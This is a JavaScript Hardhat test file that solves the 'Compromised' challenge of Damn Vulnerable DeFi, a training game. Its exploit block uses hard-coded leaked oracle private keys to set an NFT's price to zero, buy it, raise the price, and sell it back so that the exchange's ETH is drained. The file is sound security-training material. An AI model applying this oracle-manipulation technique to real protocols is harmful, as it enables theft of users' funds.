const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {
  const sources = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c',
  ];

  let deployer, attacker;
  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
  const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const ExchangeFactory = await ethers.getContractFactory(
      'Exchange',
      deployer
    );
    const DamnValuableNFTFactory = await ethers.getContractFactory(
      'DamnValuableNFT',
      deployer
    );
    const TrustfulOracleFactory = await ethers.getContractFactory(
      'TrustfulOracle',
      deployer
    );
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
      'TrustfulOracleInitializer',
      deployer
    );

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      await ethers.provider.send('hardhat_setBalance', [
        sources[i],
        '0x1bc16d674ec80000', // 2 ETH
      ]);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(
        ethers.utils.parseEther('2')
      );
    }

    // Attacker starts with 0.1 ETH in balance
    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x16345785d8a0000', // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther('0.1')
    );

    // Deploy the oracle and setup the trusted sources with initial prices
    this.oracle = TrustfulOracleFactory.attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ['DVNFT', 'DVNFT', 'DVNFT'],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      ).oracle()
    );

    // Deploy the exchange and get the associated ERC721 token
    this.exchange = await ExchangeFactory.deploy(this.oracle.address, {
      value: EXCHANGE_INITIAL_ETH_BALANCE,
    });
    this.nftToken = DamnValuableNFTFactory.attach(await this.exchange.token());
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const pkA =
      '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'; // get string representation of the low level bytes by using "https://onlinestringtools.com/convert-bytes-to-string", use `base64` decoder (https://www.base64decode.org/) to get original message. Why `base64`? See https://www.youtube.com/watch?v=8qkxeZmKmOY & https://stackoverflow.com/a/201510/11183512
    const pkB =
      '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
    const sourceA = new ethers.Wallet(pkA, ethers.provider); // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
    const sourceB = new ethers.Wallet(pkB, ethers.provider); // 0x81A5D6E50C214044bE44cA0CB057fe119097850c
    await this.oracle.connect(sourceA).postPrice('DVNFT', 0);
    await this.oracle.connect(sourceB).postPrice('DVNFT', 0);
    const buyTx = await this.exchange.connect(attacker).buyOne({
      value: ethers.utils.parseUnits('1', 'wei'),
    });
    // From: https://docs.ethers.io/v4/cookbook-contracts.html; Since a state-changing (non-constant) function can take a non-trivial amount of time to mine, the response is a transaction, and cannot return values directly. Using events, we can simulate a return value from a non-constant function.
    // for alternative to listening to events, see: https://hardhat.org/plugins/nomiclabs-hardhat-ethers#events-are-not-being-emitted & https://medium.com/txstreet/listening-to-events-in-hardhat-using-ethers-js-3e8c56b35aca & https://stackoverflow.com/questions/68432609/contract-event-listener-is-not-firing-when-running-hardhat-tests-with-ethers-js
    const buyReceipt = await buyTx.wait();
    console.log(buyReceipt.events);
    let tokenBoughtEvent = buyReceipt.events.pop(); // _safeMint also emits an `Transfer` event. `keccak256` hash of `Transfer(address,address,uint256)` (line 291) gives 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef. Usually `pop` is the way to go.
    await this.oracle
      .connect(sourceA)
      .postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    await this.oracle
      .connect(sourceB)
      .postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    await this.nftToken
      .connect(attacker)
      .approve(this.exchange.address, tokenBoughtEvent.args.tokenId); // or `args[1]`.
    await this.exchange.connect(attacker).sellOne(tokenBoughtEvent.args[1]); // like here.
    await this.oracle.connect(sourceA).postPrice('DVNFT', INITIAL_NFT_PRICE);
    await this.oracle.connect(sourceB).postPrice('DVNFT', INITIAL_NFT_PRICE);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq(
      '0'
    );

    // Attacker's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    // Attacker must not own any NFT
    expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq('0');

    // NFT price shouldn't have changed
    expect(await this.oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE);
  });
});
